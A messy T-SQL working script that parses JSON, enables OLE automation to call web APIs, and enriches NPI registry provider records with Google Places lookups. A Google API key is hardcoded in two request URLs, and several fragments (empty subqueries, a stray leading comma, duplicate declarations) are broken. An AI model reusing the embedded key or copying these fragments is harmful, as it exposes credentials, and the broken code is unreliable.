IF Object_Id('dbo.JSONPathsAndValues') IS NOT NULL DROP FUNCTION dbo.JSONPathsAndValues;
  GO
  CREATE FUNCTION dbo.JSONPathsAndValues
    /**
    Summary: >
     This function takes a JSON string and returns
    a table containing the JSON paths to the data,
    and the data itself. The JSON paths are compatible with  OPENjson, 
    JSON_Value and JSON_Modify. 

    Examples:
       - Select * from dbo.JSONPathsAndValues(N'{"person":{"info":{"name":"John", "name":"Jack"}}}')
       - Select * from MyTableWithJson cross apply dbo.JSONPathsAndValues(MyJSONColumn)
    Returns: >
    A table listing the paths to all the values in the JSON document 
    with their type and their order and nesting depth in the document
   **/
    (@JSONData NVARCHAR(MAX))
  RETURNS @TheHierarchyMetadata TABLE
    (
    -- columns returned by the function
    element_id INT NOT NULL,
    Depth INT NOT NULL,
    Thepath NVARCHAR(2000),
    ValueType VARCHAR(10) NOT NULL,
    TheValue NVARCHAR(MAX) NOT NULL
    )
  AS
    -- body of the function
    BEGIN
      DECLARE @ii INT = 1, @rowcount INT = -1;
      DECLARE @null INT = 0, @string INT = 1, @int INT = 2, --
        @boolean INT = 3, @array INT = 4, @object INT = 5;
      DECLARE @TheHierarchy TABLE
        (
        element_id INT IDENTITY(1, 1) PRIMARY KEY,
        Depth INT NOT NULL, /* effectively, the recursion level. =the depth of nesting*/
        Thepath NVARCHAR(2000) NOT NULL,
        TheName NVARCHAR(2000) NOT NULL,
        TheValue NVARCHAR(MAX) NOT NULL,
        ValueType VARCHAR(10) NOT NULL
        );
      INSERT INTO @TheHierarchy
        (Depth, Thepath, TheName, TheValue, ValueType)
        SELECT @ii, '$', '$', @JSONData, 'object';
      WHILE @rowcount <> 0
        BEGIN
          SELECT @ii = @ii + 1;
          INSERT INTO @TheHierarchy
            (Depth, Thepath, TheName, TheValue, ValueType)
            SELECT @ii,
              CASE WHEN [Key] NOT LIKE '%[^0-9]%' THEN Thepath + '[' + [Key] + ']' --nothing but numbers 
                WHEN [Key] LIKE '%[$ ]%' THEN Thepath + '."' + [Key] + '"' --got a space in it
                ELSE Thepath + '.' + [Key] END, [Key], Coalesce(Value,''),
              CASE Type WHEN @string THEN 'string'
                WHEN @null THEN 'null'
                WHEN @int THEN 'int'
                WHEN @boolean THEN 'boolean'
                WHEN @int THEN 'int'
                WHEN @array THEN 'array' ELSE 'object' END
            FROM @TheHierarchy AS m
              CROSS APPLY OpenJson(TheValue) AS o
            WHERE ValueType IN
          ('array', 'object') AND Depth = @ii - 1;
          SELECT @rowcount = @@RowCount;
        END;
      INSERT INTO @TheHierarchyMetadata
        SELECT element_id, Depth, Thepath, ValueType, TheValue 
        FROM @TheHierarchy
        WHERE ValueType NOT IN
      ('array', 'object');
      RETURN;
    END;
  GO


SELECT * INTO  #JSONTable
FROM OPENJSON (@JSONData)






    DECLARE @JSONData NVARCHAR(4000)
  
  
  SELECT @JSONData=BulkColumn FROM OPENROWSET (BULK 'C:\Users\Travis Padilla\Downloads\package_search.json', SINGLE_CLOB) import

  SELECT replace(@JSONData,'"help": "https://catalog.data.gov/api/3/action/help_show?name=package_search&host=&protocol=", "success": true, ','')

  
  SELECT * from dbo.JSONPathsAndValues(@JSONData) 

  DECLARE @TheData  table (
    -- columns returned by the function
    element_id INT NOT NULL,
    Depth INT NOT NULL,
    Thepath NVARCHAR(2000),
    ValueType VARCHAR(10) NOT NULL,
    TheValue NVARCHAR(MAX) NOT NULL
    )
   INSERT INTO @TheData SELECT * FROM dbo.JSONPathsAndValues(@JSONData)
   SELECT 
   Max(Convert(CHAR(2),CASE WHEN Thepath LIKE '%.countrycode' THEN Thevalue ELSE '' END)) AS countycode,
   Max(Convert(NVARCHAR(200),CASE WHEN Thepath LIKE '%.name' THEN Thevalue ELSE '' END)) AS name,
   Max(Convert(NUMERIC(38, 15),CASE WHEN Thepath LIKE '%.lat' THEN Thevalue ELSE '-90' END)) AS latitude,
   Max(Convert(NUMERIC(38, 15),CASE WHEN Thepath LIKE '%.lng' THEN Thevalue ELSE '-180' END)) AS longitude,
   Max(Convert(BigInt,CASE WHEN Thepath LIKE '%.population' THEN Thevalue ELSE '-1' END)) AS population,
   Max(Convert(VARCHAR(200),CASE WHEN Thepath LIKE '%.wikipedia' THEN Thevalue ELSE '' END)) AS wikipediaURL,
   Max(Convert (INT,CASE WHEN Thepath LIKE '%.geonameId' THEN Thevalue ELSE '0' END)) AS ID
   FROM @TheData GROUP BY Left(ThePath,CharIndex(']',ThePath+']'))













  IF Object_Id('dbo.DifferenceBetweenJSONstrings') IS NOT NULL
     DROP function dbo.DifferenceBetweenJSONstrings
  GO
  CREATE FUNCTION dbo.DifferenceBetweenJSONstrings
    (
    @Original nvarchar (max),-- the original JSON string
    @New nvarchar (max)      -- the New JSON string
    )
  RETURNS TABLE
   --WITH ENCRYPTION|SCHEMABINDING, ..
  AS
  RETURN
    (
    SELECT Coalesce(old.thePath, new.thepath) AS JSONpath,
      Coalesce(old.valuetype, '')
      + CASE WHEN old.valuetype + new.valuetype IS NOT NULL THEN ' \ ' ELSE '' END
      + Coalesce(new.valuetype, '') AS ValueType,
      CASE WHEN old.valuetype + new.valuetype IS NOT NULL THEN 'value type changed'
        WHEN old.thePath IS NULL THEN 'added or key changed'
        WHEN new.thePath IS NULL THEN 'missing' ELSE 'dunno' END AS TheDifference
      FROM dbo.JSONPathsAndValues(@New) AS new
        FULL OUTER JOIN dbo.JSONPathsAndValues(@original) AS old
          ON old.ThePath = new.ThePath --AND old.Valuetype=new.Valuetype
      WHERE old.thepath IS NULL OR new.thepath IS NULL OR old.ValueType <> new.ValueType
       
    );
  Go


--sp_configure 'show advanced options', 1;  
--GO  
--RECONFIGURE;  
--GO  
--sp_configure 'Ole Automation Procedures', 1;  
--GO  
--RECONFIGURE;  
--GO  

  IF NOT EXISTS (SELECT * FROM sys.configurations WHERE name ='Ole Automation Procedures' AND value=1)
  	BEGIN
     EXECUTE sp_configure 'Ole Automation Procedures', 1;
     RECONFIGURE;  
     end 
  SET ANSI_NULLS ON;
  SET QUOTED_IDENTIFIER ON;
  GO
  IF Object_Id('dbo.GetWebService','P') IS NOT NULL 
  	drop procedure dbo.GetWebService
  GO
  CREATE PROCEDURE dbo.GetWebService
    @TheURL VARCHAR(255),-- the url of the web service
    @TheResponse NVARCHAR(4000) OUTPUT --the resulting JSON
  AS
    BEGIN
      DECLARE @obj INT, @hr INT, @status INT, @message VARCHAR(255);

      EXEC @hr = sp_OACreate 'MSXML2.ServerXMLHttp', @obj OUT;
      SET @message = 'sp_OAMethod Open failed';
      IF @hr = 0 EXEC @hr = sp_OAMethod @obj, 'open', NULL, 'GET', @TheURL, false;
      SET @message = 'sp_OAMethod setRequestHeader failed';
      IF @hr = 0
        EXEC @hr = sp_OAMethod @obj, 'setRequestHeader', NULL, 'Content-Type',
          'application/x-www-form-urlencoded';
      SET @message = 'sp_OAMethod Send failed';
      --IF @hr = 0 EXEC @hr = sp_OAMethod @obj, send, NULL, '';
      --SET @message = 'sp_OAMethod read status failed';
      IF @hr = 0 EXEC @hr = sp_OAGetProperty @obj, 'status', @status OUT;
      --IF @status <> 200 BEGIN
      --                    SELECT @message = 'sp_OAMethod http status ' + Str(@status), @hr = -1;
      --  END;
      --SET @message = 'sp_OAMethod read response failed';
      IF @hr = 0
        BEGIN
          EXEC @hr = sp_OAGetProperty @obj, 'responseText', @Theresponse OUT;
          END;
      EXEC sp_OADestroy @obj;
      IF @hr <> 0 RAISERROR(@message, 16, 1);
      END;
  GO


     DECLARE @response NVARCHAR(4000) 
     EXECUTE dbo.GetWebService 'http://us-city.census.okfn.org/api/entries', @response OUTPUT

	select * from  OPENJSON (@response) 


 /**
  Example:
     DECLARE @response NVARCHAR(4000) 
     EXECUTE dbo.GetWebService 'http://headers.jsontest.com/', @response OUTPUT
     SELECT  @response 
  **/


--sp_configure 'show advanced options', 1;  
--GO  
--RECONFIGURE;  
--GO  
--sp_configure 'Ole Automation Procedures', 1;  
--GO  
--RECONFIGURE;  
--GO  


BEGIN TRY DROP TABLE #SampleTable END TRY BEGIN CATCH END CATCH
BEGIN TRY DROP TABLE #SampleTable2 END TRY BEGIN CATCH END CATCH
BEGIN TRY DROP TABLE #results END TRY BEGIN CATCH END CATCH
BEGIN TRY DROP TABLE #TheData END TRY BEGIN CATCH END CATCH
BEGIN TRY DROP TABLE #results2 END TRY BEGIN CATCH END CATCH
BEGIN TRY DROP TABLE #results3 END TRY BEGIN CATCH END CATCH
BEGIN TRY DROP TABLE #results4 END TRY BEGIN CATCH END CATCH

	DECLARE @P_NPI as INT 
	DECLARE @NPI as INT 
	DECLARE @API as VARCHAR(4000) 
	DECLARE @URL as VARCHAR(4000) 
	DECLARE @response NVARCHAR(4000)
	DECLARE @response2 NVARCHAR(4000)
	DECLARE @response3 NVARCHAR(4000)
	DECLARE @response4 NVARCHAR(4000)

	DECLARE @googleAPIaddress as VARCHAR(4000)
	DECLARE @googleAPIphone as VARCHAR(4000)

	DECLARE	@Counter INT 
			,@MaxId INT
			,@ReadStatus NVARCHAR(4000)



	CREATE TABLE #results
						(
						URL NVARCHAR(4000)
						,NPI NVARCHAR(4000)
						)

	CREATE TABLE #results2
						(
						RESULTS NVARCHAR(4000)
						,URL NVARCHAR(4000)
						,NPI NVARCHAR(4000)
						)

	CREATE TABLE #results4
						(
						RESULT1  NVARCHAR(4000)
						,RESULT2  NVARCHAR(4000)

						)						
select 
,x.[Rcount]

into #SampleTable
from (
		select 
		ROW_NUMBER() OVER (ORDER BY cast(p.Providers_NPI as nvarchar(255))) [Rcount]
		
		from ( 
		) p
		
		) x

		

SELECT @Counter = 1 , @MaxId = max(s.[Rcount]) 
FROM #SampleTable S
group by
s.npi 


WHILE(@Counter IS NOT NULL
      AND @Counter <= @MaxId)

BEGIN

   SELECT 
			@P_NPI = s.NPI
   FROM #SampleTable  s WHERE s.[Rcount] = @Counter

SET @Counter  = @Counter  + 1   

	DECLARE @TheURL as VARCHAR(4000) 
	DECLARE @TheResponse VARCHAR(4000)


			SET @TheURL = 'https://catalog.data.gov/api/3/action/package_search?'

			EXECUTE dbo.GetWebService @TheURL,@TheResponse OUTPUT
			select left(@TheResponse,len(4000))
			
SELECT * from openjson(left(@TheResponse,len(@TheResponse)))

INSERT into #results2 						(
						RESULTS
						,URL
						,NPI 
						)
  VALUES (@response,@URL,@NPI)

END

SELECT 
		location.created_epoch			
		,location.enumeration_type		
		,location.last_updated_epoch		
		,location.number					
		,location.credential  			
		,location.enumeration_date 	
		,location.gender  			
		,location.name_prefix  	
		,location.first_name  	
		,location.middle_name  		
		,location.last_name  		
		,location.name  	
		,location.last_updated  			
		,location.sole_proprietor  		
		,location.status  
		,location.L_address_1  			
		,location.L_address_2  			
		,location.L_city  				
		,location.L_state  	
		,left(location.L_postal_code,5)  L_postal_code	  	
		,replace(location.L_telephone_number,'-','')  	L_telephone_number
		,replace(location.L_fax_number,'-','')  	L_fax_number	
		,location.M_address_1  			
		,location.M_address_2  			
		,location.M_city  				
		,location.M_state  		
		,left(location.M_postal_code,5)  	 M_postal_code 		
		,replace(location.M_telephone_number,'-','')	M_telephone_number
		,replace(location.M_fax_number,'-','')		M_fax_number	
		,location.p_address_1  		
		,location.p_address_2  		
		,location.p_city  			
		,location.p_state  		
		,left(location.p_postal_code,5)  	  p_postal_code	
		,location.p_telephone_number 
		,location.p_fax_number 
		,location.p_update_date  	
		,location.p2_address_1  			
		,location.p2_address_2  			
		,location.p2_city  					
		,left(location.p2_postal_code,5)  	p2_postal_code		
		,location.p2_state  				
		,location.p2_telephone_number  
		,location.p2_fax_number 
		,location.p2_update_date  			
		,location.code  					
		,location.[desc]  				
		,location.license  				
		,location.[primary]  			
		,location.state2  		
FROM #results2 R
				CROSS APPLY OPENJSON ( RESULTS ,'$.results[0]') 
	WITH (
			created_epoch					nVARCHAR(4000) '$.created_epoch'
			,enumeration_type				nVARCHAR(4000) '$.enumeration_type'
			,last_updated_epoch				nVARCHAR(4000) '$.last_updated_epoch'
			,number							nVARCHAR(4000) '$.number'
			,credential  					nVARCHAR(4000) '$.basic.credential'
			,enumeration_date 				nVARCHAR(4000) '$.basic.enumeration_date'
			,first_name  					nVARCHAR(4000) '$.basic.first_name'
			,gender  						nVARCHAR(4000) '$.basic.gender'
			,last_name  					nVARCHAR(4000) '$.basic.last_name'
			,last_updated  					nVARCHAR(4000) '$.basic.last_updated'
			,middle_name  					nVARCHAR(4000) '$.basic.middle_name'
			,name  							nVARCHAR(4000) '$.basic.name'
			,name_prefix  					nVARCHAR(4000) '$.basic.name_prefix'
			,sole_proprietor  				nVARCHAR(4000) '$.basic.sole_proprietor'
			,status  						nVARCHAR(4000) '$.basic.status'
			,L_address_1  					nVARCHAR(4000) '$.addresses[0].address_1'
			,L_address_2  					nVARCHAR(4000) '$.addresses[0].address_2'
			,L_address_purpose  			nVARCHAR(4000) '$.addresses[0].address_purpose'
			,L_address_type  				nVARCHAR(4000) '$.addresses[0].address_type'
			,L_city  						nVARCHAR(4000) '$.addresses[0].city'
			,L_country_code  				nVARCHAR(4000) '$.addresses[0].country_code'
			,L_country_name  				nVARCHAR(4000) '$.addresses[0].country_name'
			,L_fax_number  					nVARCHAR(4000) '$.addresses[0].fax_number'
			,L_postal_code  				nVARCHAR(4000) '$.addresses[0].postal_code'
			,L_state  						nVARCHAR(4000) '$.addresses[0].state'
			,L_telephone_number  			nVARCHAR(4000) '$.addresses[0].telephone_number'
			,M_address_1  					nVARCHAR(4000) '$.addresses[1].address_1'
			,M_address_2  					nVARCHAR(4000) '$.addresses[1].address_2'
			,M_address_purpose  			nVARCHAR(4000) '$.addresses[1].address_purpose'
			,M_address_type  				nVARCHAR(4000) '$.addresses[1].address_type'
			,M_city  						nVARCHAR(4000) '$.addresses[1].city'
			,M_country_code  				nVARCHAR(4000) '$.addresses[1].country_code'
			,M_country_name  				nVARCHAR(4000) '$.addresses[1].country_name'
			,M_fax_number  					nVARCHAR(4000) '$.addresses[1].fax_number'
			,M_postal_code  				nVARCHAR(4000) '$.addresses[1].postal_code'
			,M_state  						nVARCHAR(4000) '$.addresses[1].state'
			,M_telephone_number  			nVARCHAR(4000) '$.addresses[1].telephone_number'
			,p_address_1  					nVARCHAR(4000) '$.practiceLocations[0].address_1'
			,p_address_2  					nVARCHAR(4000) '$.practiceLocations[0].address_2'
			,p_address_type  				nVARCHAR(4000) '$.practiceLocations[0].address_type'
			,p_city  						nVARCHAR(4000) '$.practiceLocations[0].city'
			,p_country_code  				nVARCHAR(4000) '$.practiceLocations[0].country_code'
			,p_country_name  				nVARCHAR(4000) '$.practiceLocations[0].country_name'
			,p_postal_code  				nVARCHAR(4000) '$.practiceLocations[0].postal_code'
			,p_state  						nVARCHAR(4000) '$.practiceLocations[0].state'
			,p_telephone_number  			nVARCHAR(4000) '$.practiceLocations[0].telephone_number'
			,p_fax_number		 			nVARCHAR(4000) '$.practiceLocations[0].fax_number'
			,p_update_date  				nVARCHAR(4000) '$.practiceLocations[0].update_date'
			,p2_address_1  					nVARCHAR(4000) '$.practiceLocations[1].address_1'
			,p2_address_2  					nVARCHAR(4000) '$.practiceLocations[1].address_2'
			,p2_address_type  				nVARCHAR(4000) '$.practiceLocations[1].address_type'
			,p2_city  						nVARCHAR(4000) '$.practiceLocations[1].city'
			,p2_country_code  				nVARCHAR(4000) '$.practiceLocations[1].country_code'
			,p2_country_name  				nVARCHAR(4000) '$.practiceLocations[1].country_name'
			,p2_postal_code  				nVARCHAR(4000) '$.practiceLocations[1].postal_code'
			,p2_state  						nVARCHAR(4000) '$.practiceLocations[1].state'
			,p2_telephone_number  			nVARCHAR(4000) '$.practiceLocations[1].telephone_number'
			,p2_fax_number		 			nVARCHAR(4000) '$.practiceLocations[1].fax_number'
			,p2_update_date  				nVARCHAR(4000) '$.practiceLocations[1].update_date'
			,code  							nVARCHAR(4000) '$.taxonomies[0].code'
			,[desc]  						nVARCHAR(4000) '$.taxonomies[0].desc'
			,license  						nVARCHAR(4000) '$.taxonomies[0].license'
			,[primary]  					nVARCHAR(4000) '$.taxonomies[0].primary'
			,state2  						nVARCHAR(4000) '$.taxonomies[0].state'
		)  
     AS location

BEGIN TRY DROP TABLE #SampleTable END TRY BEGIN CATCH END CATCH
BEGIN TRY DROP TABLE #SampleTable2 END TRY BEGIN CATCH END CATCH
BEGIN TRY DROP TABLE #results END TRY BEGIN CATCH END CATCH
BEGIN TRY DROP TABLE #TheData END TRY BEGIN CATCH END CATCH
BEGIN TRY DROP TABLE #results2 END TRY BEGIN CATCH END CATCH
BEGIN TRY DROP TABLE #results3 END TRY BEGIN CATCH END CATCH
BEGIN TRY DROP TABLE #results4 END TRY BEGIN CATCH END CATCH

	DECLARE @P_NPI as INT 
	DECLARE @NPI as INT 
	DECLARE @API as VARCHAR(4000) 
	DECLARE @URL as VARCHAR(4000) 
	DECLARE @response NVARCHAR(4000)
	DECLARE @response2 NVARCHAR(4000)
	DECLARE @response3 NVARCHAR(4000)
	DECLARE @response4 NVARCHAR(4000)

	DECLARE @googleAPIaddress as VARCHAR(4000)
	DECLARE @googleAPIphone as VARCHAR(4000)

	DECLARE	@Counter INT 
			,@MaxId INT
			,@ReadStatus NVARCHAR(4000)



	CREATE TABLE #results
						(
						URL NVARCHAR(4000)
						,NPI NVARCHAR(4000)
						)

	CREATE TABLE #results2
						(
						RESULTS NVARCHAR(4000)
						,URL NVARCHAR(4000)
						,NPI NVARCHAR(4000)
						)

	CREATE TABLE #results4
						(
						RESULT1  NVARCHAR(4000)
						,RESULT2  NVARCHAR(4000)

						)						




select 
x.npi 
,x.[Rcount]

into #SampleTable
from (
		select 
		ROW_NUMBER() OVER (ORDER BY cast(p.Providers_NPI as nvarchar(255))) [Rcount]
		
		from () p
		
		) x

		

SELECT @Counter = 1 , @MaxId = max(s.[Rcount]) 
FROM #SampleTable S
group by
s.npi 


WHILE(@Counter IS NOT NULL
      AND @Counter <= @MaxId)

BEGIN

   SELECT 
			@P_NPI = s.NPI
   FROM #SampleTable  s WHERE s.[Rcount] = @Counter

SET @Counter  = @Counter  + 1   

			SET @API = 'https://npiregistry.cms.hhs.gov/api/?version=2.1&pretty=true&number='
			SET @NPI = @P_NPI --+ @Counter 
			SET @URL = @API + cast(@NPI as varchar(150))

			EXECUTE dbo.GetWebService @URL,@response OUTPUT;


INSERT into #results2 						(
						RESULTS
						,URL
						,NPI 
						)
  VALUES (@response,@URL,@NPI)

END

	DECLARE @URL as VARCHAR(4000) 
	DECLARE @response as VARCHAR(4000) 

			SET @URL = 'https://catalog.data.gov/api/3/action/package_search?q=business&rows=1.json'


			EXECUTE dbo.GetWebService @URL,@response OUTPUT
			select * from OPENJSON(@response,'$')


SELECT 

		location.created_epoch			
		,location.enumeration_type		
		,location.last_updated_epoch		
		,location.number					
		,location.credential  			
		,location.enumeration_date 		
		,location.first_name  			
		,location.gender  				
		,location.last_name  			
		,location.last_updated  			
		,location.middle_name  			
		,location.name  					
		,location.name_prefix  			
		,location.sole_proprietor  		
		,location.status  
		,location.L_address_1  			
		,location.L_address_2  			
		,location.L_address_purpose  	
		,location.L_address_type  		
		,location.L_city  				
		,location.L_country_code  		
		,location.L_country_name  		
		,replace(location.L_fax_number,'-','')  	L_fax_number		
		,location.L_postal_code  		
		,location.L_state  				
		,replace(location.L_telephone_number,'-','')  	L_telephone_number
		,location.M_address_1  			
		,location.M_address_2  			
		,location.M_address_purpose  	
		,location.M_address_type  		
		,location.M_city  				
		,location.M_country_code  		
		,location.M_country_name  		
		,replace(location.M_fax_number,'-','')		M_fax_number				
		,location.M_postal_code  		
		,location.M_state  				
		,replace(location.M_telephone_number,'-','')	M_telephone_number
		,location.p_address_1  		
		,location.p_address_2  		
		,location.p_address_type  	
		,location.p_city  			
		,location.p_country_code  	
		,location.p_country_name  	
		,location.p_postal_code  	
		,location.p_state  			
		,location.p_telephone_number 
		,location.p_update_date  	
		,location.code  					
		,location.[desc]  				
		,location.license  				
		,location.[primary]  			
		,location.state2  		
		,cast('' as nvarchar(4000)) as GoogleAPIgeoLINK
		,cast('' as nvarchar(4000)) as GoogleAPIphoneLINK
		,cast('' as nvarchar(4000)) as GoogleAPIgeo
		,cast('' as nvarchar(4000)) as GoogleAPIphone
into #results3 
FROM #results2 R
				CROSS APPLY OPENJSON ( RESULTS ,'$.results[0]') 
	WITH (
			created_epoch					nVARCHAR(4000) '$.created_epoch'
			,enumeration_type				nVARCHAR(4000) '$.enumeration_type'
			,last_updated_epoch				nVARCHAR(4000) '$.last_updated_epoch'
			,number							nVARCHAR(4000) '$.number'
			,credential  					nVARCHAR(4000) '$.basic.credential'
			,enumeration_date 				nVARCHAR(4000) '$.basic.enumeration_date'
			,first_name  					nVARCHAR(4000) '$.basic.first_name'
			,gender  						nVARCHAR(4000) '$.basic.gender'
			,last_name  					nVARCHAR(4000) '$.basic.last_name'
			,last_updated  					nVARCHAR(4000) '$.basic.last_updated'
			,middle_name  					nVARCHAR(4000) '$.basic.middle_name'
			,name  							nVARCHAR(4000) '$.basic.name'
			,name_prefix  					nVARCHAR(4000) '$.basic.name_prefix'
			,sole_proprietor  				nVARCHAR(4000) '$.basic.sole_proprietor'
			,status  						nVARCHAR(4000) '$.basic.status'
			,L_address_1  					nVARCHAR(4000) '$.addresses[0].address_1'
			,L_address_2  					nVARCHAR(4000) '$.addresses[0].address_2'
			,L_address_purpose  			nVARCHAR(4000) '$.addresses[0].address_purpose'
			,L_address_type  				nVARCHAR(4000) '$.addresses[0].address_type'
			,L_city  						nVARCHAR(4000) '$.addresses[0].city'
			,L_country_code  				nVARCHAR(4000) '$.addresses[0].country_code'
			,L_country_name  				nVARCHAR(4000) '$.addresses[0].country_name'
			,L_fax_number  					nVARCHAR(4000) '$.addresses[0].fax_number'
			,L_postal_code  				nVARCHAR(4000) '$.addresses[0].postal_code'
			,L_state  						nVARCHAR(4000) '$.addresses[0].state'
			,L_telephone_number  			nVARCHAR(4000) '$.addresses[0].telephone_number'
			,M_address_1  					nVARCHAR(4000) '$.addresses[1].address_1'
			,M_address_2  					nVARCHAR(4000) '$.addresses[1].address_2'
			,M_address_purpose  			nVARCHAR(4000) '$.addresses[1].address_purpose'
			,M_address_type  				nVARCHAR(4000) '$.addresses[1].address_type'
			,M_city  						nVARCHAR(4000) '$.addresses[1].city'
			,M_country_code  				nVARCHAR(4000) '$.addresses[1].country_code'
			,M_country_name  				nVARCHAR(4000) '$.addresses[1].country_name'
			,M_fax_number  					nVARCHAR(4000) '$.addresses[1].fax_number'
			,M_postal_code  				nVARCHAR(4000) '$.addresses[1].postal_code'
			,M_state  						nVARCHAR(4000) '$.addresses[1].state'
			,M_telephone_number  			nVARCHAR(4000) '$.addresses[1].telephone_number'
			,p_address_1  					nVARCHAR(4000) '$.results[0].practiceLocations.address_1'
			,p_address_2  					nVARCHAR(4000) '$.results[0].practiceLocations.address_2'
			,p_address_type  			nVARCHAR(4000) '$.results[0].practiceLocations.address_type'
			,p_city  			nVARCHAR(4000) '$.results[0].practiceLocations.city'
			,p_country_code  			nVARCHAR(4000) '$.results[0].practiceLocations.country_code'
			,p_country_name  			nVARCHAR(4000) '$.results[0].practiceLocations.country_name'
			,p_postal_code  			nVARCHAR(4000) '$.results[0].practiceLocations.postal_code'
			,p_state  			nVARCHAR(4000) '$.results[0].practiceLocations.state'
			,p_telephone_number  			nVARCHAR(4000) '$.results[0].practiceLocations.telephone_number'
			,p_update_date  			nVARCHAR(4000) '$.results[0].practiceLocations.update_date'
			,code  							nVARCHAR(4000) '$.taxonomies[0].code'
			,[desc]  						nVARCHAR(4000) '$.taxonomies[0].desc'
			,license  						nVARCHAR(4000) '$.taxonomies[0].license'
			,[primary]  					nVARCHAR(4000) '$.taxonomies[0].primary'
			,state2  						nVARCHAR(4000) '$.taxonomies[0].state'
		)  
     AS location


select 
x.npi 
,x.[Rcount]
,X.APIgeo
,X.APIphone
into #SampleTable2
from (
SELECT 
		
		'https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=' + r.L_address_1 			
		 + r.L_address_2 				
		 + r.L_city						
		 + r.L_state + '&inputtype=textquery&fields=name,business_status,formatted_address,geometry/location,type&key=AIzaSyCcXq1yMVYcOctZhMoepTm8kXrBNTHVIZc' as APIgeo
		, 'https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=%2B1' + replace(r.L_telephone_number,'-','') 
		+ '&inputtype=phonenumber&fields=name,business_status,formatted_address,geometry/location,type&key=AIzaSyCcXq1yMVYcOctZhMoepTm8kXrBNTHVIZc' as APIphone 
		,r.Number as NPI
		,ROW_NUMBER() OVER (ORDER BY cast(R.Number as nvarchar(255))) [Rcount]

FROM #results3 R
		
		) x


SELECT @Counter = 1 , @MaxId = max(s.[Rcount]) 
FROM #SampleTable2 S
group by
s.npi 


	 WHILE(@Counter IS NOT NULL
      AND @Counter <= @MaxId)

BEGIN

SELECT 
		@googleAPIaddress = APIgeo
		,@googleAPIphone = APIphone
		,@NPI =  NPI

FROM #SampleTable2 S
WHERE s.[Rcount] = @Counter

SET @Counter  = @Counter  + 1   

			EXECUTE dbo.GetWebService @googleAPIaddress,@response3 OUTPUT;
			EXECUTE dbo.GetWebService @googleAPIphone,@response4 OUTPUT;


			update  #results3  
			set GoogleAPIgeo = @response3
			, GoogleAPIphone = @response4
			,GoogleAPIgeoLINK = @googleAPIaddress
			,GoogleAPIphoneLINK = @googleAPIphone
			where NUMBER = @NPI
END
		
select 
		R1.RESULTS
		,R1.URL
		,R1.NPI
		,R2.number					
		,R2.credential  			
		,R2.gender  	
		,R2.name_prefix 
		,R2.first_name  	
		,R2.middle_name 
		,R2.last_name  			
		,R2.name  							
		,R2.status  
		,R2.L_address_1  			as pStreet1
		,R2.L_address_2  			as pStreet2
		,R2.L_city  				as pCity
		,R2.L_state  		 as pSt		
		,left(R2.L_postal_code,5) as pZip		
		,R2.L_country_code  		as pCountry
		,R2.L_telephone_number   as pPhone	
		,R2.L_fax_number  			as pFax
		,R2.M_address_1  			as mStreet1
		,R2.M_address_2  			as mStreet2
		,R2.M_city  				as mCity
		,R2.M_state  				as mSt
		,left(R2.M_postal_code,5)  as mZip		
		,R2.M_country_code  		as mCountry
		,R2.M_telephone_number  	as mPhone
		,R2.M_fax_number  			as mFax
			,R2.p_address_1  					
			,R2.p_address_2  					
			,R2.p_address_type  	
			,R2.p_city  			
			,R2.p_country_code  	
			,R2.p_country_name  	
			,R2.p_postal_code  		
			,R2.p_state  			
			,R2.p_telephone_number  
			,R2.p_update_date  		
		,R2.code  					
		,R2.[desc]  				
		,R2.license  				
		,R2.[primary]  			
		,R2.state2  	
		,R2.GoogleAPIphoneLINK as APIphoLINK
		,R2.GoogleAPIphone as APIpho
		,ISNULL(PHO.business_status,'NoData') as phoBizStatus
		,ISNULL(PHO.formatted_address,'NoData')   as phoBizAddress
		,ISNULL(PHO.name,'NoData')  				as phoBizName
		,ISNULL(PHO.type1,'NoData') 			as phoBizType1
		,ISNULL(PHO.type2,'NoData') 			as phoBizType2
		,ISNULL(PHO.type3,'NoData') 			as phoBizType3
		,ISNULL(PHO.type4,'NoData') 			as phoBizType4
		,ISNULL(PHO.type5,'NoData') 			as phoBizType5
		,ISNULL(PHO.lat,'NoData')  				as pholat
		,ISNULL(PHO.lng,'NoData')  			as pholng
		,R2.GoogleAPIgeoLINK as APIgeoLINK
		,R2.GoogleAPIgeo as APIgeo
		,ISNULL(GEO.business_status,'NoData') as geoBizStatus
		,ISNULL(GEO.formatted_address,'NoData')   as geoBizAddress
		,ISNULL(GEO.name,'NoData')  				as geoBizName
		,ISNULL(GEO.type1,'NoData') 			as geoBizType1
		,ISNULL(GEO.type2,'NoData') 			as geoBizType2
		,ISNULL(GEO.type3,'NoData') 			as geoBizType3
		,ISNULL(GEO.type4,'NoData') 			as geoBizType4
		,ISNULL(GEO.type5,'NoData') 			as geoBizType5
		,ISNULL(GEO.lat,'NoData')  				as geolat
		,ISNULL(GEO.lng,'NoData')  			as geolng			
into simondw.dbo.npiLookup
from #RESULTS2 R1 
LEFT JOIN #results3 R2 ON R1.NPI = R2.number
cross apply openjson(GoogleAPIgeo, '$') 
with(
			business_status  						nVARCHAR(4000) '$.candidates[0].business_status'
			,formatted_address  						nVARCHAR(4000) '$.candidates[0].formatted_address'
			,name  						nVARCHAR(4000) '$.candidates[0].name'
			,type1  						nVARCHAR(4000) '$.candidates[0].types[0]'
			,type2  						nVARCHAR(4000) '$.candidates[0].types[1]'
			,type3  						nVARCHAR(4000) '$.candidates[0].types[2]'
			,type4  						nVARCHAR(4000) '$.candidates[0].types[3]'
			,type5  						nVARCHAR(4000) '$.candidates[0].types[4]'
			,lat  						nVARCHAR(4000) '$.candidates[0].geometry.location.lat'
			,lng  						nVARCHAR(4000) '$.candidates[0].geometry.location.lng'

) as geo
cross apply openjson(GoogleAPIphone)
with(
			business_status  						nVARCHAR(4000) '$.candidates[0].business_status'
			,formatted_address  						nVARCHAR(4000) '$.candidates[0].formatted_address'
			,name  						nVARCHAR(4000) '$.candidates[0].name'
			,type1  						nVARCHAR(4000) '$.candidates[0].types[0]'
			,type2  						nVARCHAR(4000) '$.candidates[0].types[1]'
			,type3  						nVARCHAR(4000) '$.candidates[0].types[2]'
			,type4  						nVARCHAR(4000) '$.candidates[0].types[3]'
			,type5  						nVARCHAR(4000) '$.candidates[0].types[4]'
			,lat  						nVARCHAR(4000) '$.candidates[0].geometry.location.lat'
			,lng  						nVARCHAR(4000) '$.candidates[0].geometry.location.lng'

) as pho







------------------------------------------------------------------------------
------------------------------------------------------------------------------
------------------------------------------------------------------------------
------------------------------------------------------------------------------
------------------------------------------------------------------------------
------------------------------------------------------------------------------
------------------------------------------------------------------------------
------------------------------------------------------------------------------
------------------------------------------------------------------------------
